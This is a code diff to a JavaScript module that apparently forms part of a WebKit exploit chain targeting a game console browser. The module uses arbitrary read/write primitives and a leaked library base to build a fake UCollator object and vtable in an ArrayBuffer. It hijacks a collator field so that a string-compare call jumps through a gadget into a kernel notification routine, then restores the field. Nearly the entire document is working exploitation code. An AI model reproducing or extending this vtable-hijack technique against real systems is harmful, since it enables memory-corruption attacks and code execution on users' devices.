@@ -179,7 +179,21 @@ function resolveArenaBacking(p, off, arenaBuffer, arenaView, leakval, log, opts)
 
 function useArenaRequest(params) {
     const q = params || new URLSearchParams(location.search);
-    return q.get("notifystr") !== "1";
+    return q.get("notifystr") === "arena";
+}
+
+function notifySmokeTarget(params, off) {
+    const q = params || new URLSearchParams(location.search);
+    const sm = q.get("notifysmoke");
+    if (sm === "usleep") return off.k_usleep || 0x13b20;
+    if (sm === "getpid") return off.k_stubs && off.k_stubs[20] || 0x2cb70;
+    if (sm === "notify") return off.k_notify || 0x19320;
+    return null;
+}
+
+function zeroFakeOperands(view, fakeOff) {
+    for (let i = 0x48; i < 0x50; i++) view[fakeOff + i] = 0;
+    for (let i = 0x60; i < 0x68; i++) view[fakeOff + i] = 0;
 }
 
 function putU64le(view, offset, val) {
@@ -200,6 +214,34 @@ function writeNotificationRequestToView(view, offset, message) {
     view[offset] = NOTIFY_API_ORBIS;
     for (let i = 0; i < msg.length; i++)
         view[offset + NOTIFICATION_MESSAGE_OFFSET + i] = msg.charCodeAt(i) & 0xff;
+}
+
+function hookCollatorField(p, pin, fakePtr, carrier, bump) {
+    const field = pin.collatorFieldAddr;
+    const orig = p.read8(field);
+    const addrNum = (field.low >>> 0) + field.hi * 0x100000000;
+    if (carrier && typeof carrier.aim === "function") {
+        bump("NOTIFY-S24", "carrier aim collator+0x18");
+        carrier.aim(addrNum);
+        putLow48(carrier.view, 0, fakePtr);
+        carrier.restore();
+    } else {
+        bump("NOTIFY-S24", "write8 fake UCollator ptr");
+        p.write8(field, fakePtr);
+    }
+    return orig;
+}
+
+function restoreCollatorField(p, pin, orig, carrier) {
+    const field = pin.collatorFieldAddr;
+    const addrNum = (field.low >>> 0) + field.hi * 0x100000000;
+    if (carrier && typeof carrier.aim === "function") {
+        carrier.aim(addrNum);
+        putLow48(carrier.view, 0, orig);
+        carrier.restore();
+    } else {
+        p.write8(field, orig);
+    }
 }
 
 function patchFakeNotifyArgs(view, fakeOff, reqPtr, reqSize) {
@@ -381,7 +423,7 @@ export function pinNotifyHeap(ctx) {
 
     const arenaMode = useArenaRequest(ctx.params);
     let notificationRequest = null;
-    let compareArg = "a";
+    let compareArg;
 
     bump("NOTIFY-S05", "ArrayBuffer 0x" + ARENA_BYTES.toString(16));
     const arenaBuffer = new ArrayBuffer(ARENA_BYTES);
@@ -389,14 +431,15 @@ export function pinNotifyHeap(ctx) {
     const arenaView = new Uint8Array(arenaBuffer);
 
     if (arenaMode) {
-        bump("NOTIFY-S04", "write 0xc30 req → arena@" + REQ_ARENA_OFFSET.toString(16));
+        bump("NOTIFY-S04", "arena struct + empty JS arg");
         writeNotificationRequestToView(arenaView, REQ_ARENA_OFFSET, cfg.message);
-        bump("NOTIFY-S04-OK", "arena bytes, no JS string");
+        compareArg = "\x00";
+        bump("NOTIFY-S04-OK", "arena bytes");
     } else {
-        bump("NOTIFY-S04", "build 0xc30 JS string (?notifystr=1)");
+        bump("NOTIFY-S04", "build+retain 0xc30 string (slopkit path)");
         notificationRequest = getNotificationRequest(cfg.message);
         compareArg = notificationRequest;
-        bump("NOTIFY-S04-OK", "req len=" + notificationRequest.length);
+        bump("NOTIFY-S04-OK", "len=" + notificationRequest.length);
     }
 
     bump("NOTIFY-S07", "arena marker ROP1");
@@ -429,24 +472,22 @@ export function pinNotifyHeap(ctx) {
     const fakeVtableAddr = arenaBacking.add32(FAKE_VTABLE_OFFSET);
     bump("NOTIFY-S12", "fake UCollator vtable ptr");
     putLow48(arenaView, FAKE_UCOLLATOR_OFFSET + 0x00, fakeVtableAddr);
-    bump("NOTIFY-S13", "fake+0x48 req ptr +0x60 size");
-    const reqAddr = arenaBacking.add32(REQ_ARENA_OFFSET);
-    patchFakeNotifyArgs(arenaView, FAKE_UCOLLATOR_OFFSET, reqAddr, NOTIFICATION_REQUEST_SIZE);
-    bump("NOTIFY-S13b", "zero padding 0x48 inner (slopkit)");
-    for (let i = 0x48; i < 0x50; i++) {
-        if (!arenaMode) arenaView[FAKE_UCOLLATOR_OFFSET + i] = 0;
-    }
-    for (let i = 0x60; i < 0x68; i++) {
-        if (!arenaMode) arenaView[FAKE_UCOLLATOR_OFFSET + i] = 0;
+    bump("NOTIFY-S13", "zero fake+0x48/+0x60 (WebKit fills @ compare)");
+    zeroFakeOperands(arenaView, FAKE_UCOLLATOR_OFFSET);
+    if (arenaMode) {
+        bump("NOTIFY-S13a", "arena preset +0x48 req (experimental)");
+        patchFakeNotifyArgs(
+            arenaView, FAKE_UCOLLATOR_OFFSET,
+            arenaBacking.add32(REQ_ARENA_OFFSET), NOTIFICATION_REQUEST_SIZE);
     }
 
-    bump("NOTIFY-S15", "prewarm compareFn(" + (arenaMode ? "a" : "0xc30") + ", b)");
+    bump("NOTIFY-S15", "prewarm compareFn(unhooked)");
     const pre = compareFn(compareArg, "b");
-    if (!Number.isFinite(pre) && arenaMode)
-        throw new Error("notify pin: prewarm failed");
+    if (!Number.isFinite(pre))
+        throw new Error("notify pin: prewarm failed pre=" + pre);
     bump("NOTIFY-S15-OK", "prewarm=" + pre);
-
-    bump("NOTIFY-S14", "PIN-OK coll=" + realCollatorAddr + " arenaReq=" + reqAddr);
+    const reqAddr = arenaBacking.add32(REQ_ARENA_OFFSET);
+    bump("NOTIFY-S14", "PIN-OK coll=" + realCollatorAddr);
     return {
         realCollator,
         compareFn,
@@ -477,47 +518,66 @@ export function fireNotifyPinned(p, pin, lk, off, log, opts) {
     log = log || function () { };
     opts = opts || {};
     const flush = opts.flush || null;
+    const params = opts.params || new URLSearchParams(location.search);
+    const carrier = opts.carrier || null;
     const bump = function (tag, detail) { stageBump(log, flush, tag, detail); };
 
-    const cfg = pin.cfg || resolveNotifyConfig(off, null);
+    const cfg = pin.cfg || resolveNotifyConfig(off, params);
     const gdRva = cfg.gd || off.wk_notify_gd || 0;
-    const ntRva = cfg.nt || off.k_notify || 0;
+    let ntRva = cfg.nt || off.k_notify || 0;
+    const smokeNt = notifySmokeTarget(params, off);
+    if (smokeNt != null) ntRva = smokeNt;
     if (!gdRva || !ntRva)
         throw new Error("notify fire: gd/nt missing in offset table");
 
-    bump("NOTIFY-S20", "fire enter lk=" + lk + " gd=0x" + gdRva.toString(16)
-        + " nt=0x" + ntRva.toString(16) + " arena=" + !!pin.arenaMode);
+    const argLabel = pin.arenaMode ? "0x1" : "0xc30";
+    bump("NOTIFY-S20", "fire lk=" + lk + " gd=0x" + gdRva.toString(16)
+        + " nt=0x" + ntRva.toString(16)
+        + (smokeNt != null ? " smoke=" + params.get("notifysmoke") : ""));
 
     const notifyEntry = lk.add32(ntRva);
-    const trampoline = lk.add32(gdRva);
-    bump("NOTIFY-S21", "patch notifyEntry @ fakeUC+0xe0");
-    putLow48(pin.arenaView, FAKE_UCOLLATOR_OFFSET + 0xe0, notifyEntry);
-    bump("NOTIFY-S22", "patch trampoline @ fakeVT+0x128");
-    putLow48(pin.arenaView, FAKE_VTABLE_OFFSET + 0x128, trampoline);
-
-    if (pin.arenaMode && pin.reqAddr) {
-        bump("NOTIFY-S22b", "refresh fake+0x48/+0x60 arena req");
-        patchFakeNotifyArgs(
-            pin.arenaView, FAKE_UCOLLATOR_OFFSET, pin.reqAddr, NOTIFICATION_REQUEST_SIZE);
+    let vtableTarget = lk.add32(gdRva);
+    if (params.get("notifydirect") === "1") {
+        bump("NOTIFY-S20d", "direct vtable→nt (skip gd)");
+        vtableTarget = notifyEntry;
     }
 
-    bump("NOTIFY-S23", "read8 collator field orig");
-    const collatorOriginal = p.read8(pin.collatorFieldAddr);
-    bump("NOTIFY-S24", "write8 fake UCollator ptr");
-    p.write8(pin.collatorFieldAddr, pin.fakeUCollatorAddr);
+    bump("NOTIFY-S21", "patch fakeUC+0xe0");
+    putLow48(pin.arenaView, FAKE_UCOLLATOR_OFFSET + 0xe0, notifyEntry);
+    bump("NOTIFY-S22", "patch fakeVT+0x128 trampoline");
+    putLow48(pin.arenaView, FAKE_VTABLE_OFFSET + 0x128, vtableTarget);
+    zeroFakeOperands(pin.arenaView, FAKE_UCOLLATOR_OFFSET);
+    if (pin.arenaMode && pin.reqAddr) {
+        bump("NOTIFY-S22b", "arena +0x48 req preset");
+        putLow48(pin.arenaView, FAKE_UCOLLATOR_OFFSET + 0x48, pin.reqAddr);
+    }
 
     const arg = pin.compareArg != null ? pin.compareArg
-        : (pin.notificationRequest || "a");
+        : (pin.notificationRequest || "\x00");
+
+    if (params.get("notifybisect") === "1") {
+        bump("NOTIFY-S24u", "unhooked compareFn(" + argLabel + ", b)");
+        let uPre = NaN;
+        try { uPre = pin.compareFn(arg, "b"); } catch (e) {
+            bump("NOTIFY-S24u-FAIL", e && e.message ? e.message : String(e));
+        }
+        bump("NOTIFY-S24u-OK", "pre=" + uPre);
+    }
+
+    bump("NOTIFY-S23", "hook collator → fakeUC");
+    const collatorOriginal = hookCollatorField(
+        p, pin, pin.fakeUCollatorAddr, carrier, bump);
+
     let notifyResult = NaN;
     let callError = null;
-    bump("NOTIFY-S25", "compareFn(" + (pin.arenaMode ? "a" : "0xc30") + ", b)");
+    bump("NOTIFY-S25", "hooked compareFn(" + argLabel + ", b)");
     try {
         notifyResult = pin.compareFn(arg, "b");
     } catch (err) {
         callError = err;
     }
-    bump("NOTIFY-S26", "restore collator field");
-    p.write8(pin.collatorFieldAddr, collatorOriginal);
+    restoreCollatorField(p, pin, collatorOriginal, carrier);
+    bump("NOTIFY-S26", "restored");
 
     if (callError)
         throw callError;
@@ -526,6 +586,16 @@ export function fireNotifyPinned(p, pin, lk, off, log, opts) {
     const sent = ok && notifyResult === 0;
     bump("NOTIFY-S27", "DONE result=" + notifyResult + " sent=" + sent);
     return { result: notifyResult, sent, ok };
+}
+
+/** Sync pin → fire — no async gap between prewarm and hooked compare. */
+export function runNotifyAtomic(ctx) {
+    const pin = pinNotifyHeap(ctx);
+    return fireNotifyPinned(ctx.p, pin, ctx.lk, ctx.off, ctx.log, {
+        flush: ctx.flush,
+        params: ctx.params,
+        carrier: ctx.carrier || null,
+    });
 }
 
 /**
@@ -723,4 +793,5 @@ export {
     buildNotificationRequest,
     writeNotificationRequestToView,
     useArenaRequest,
+    runNotifyAtomic,
 };
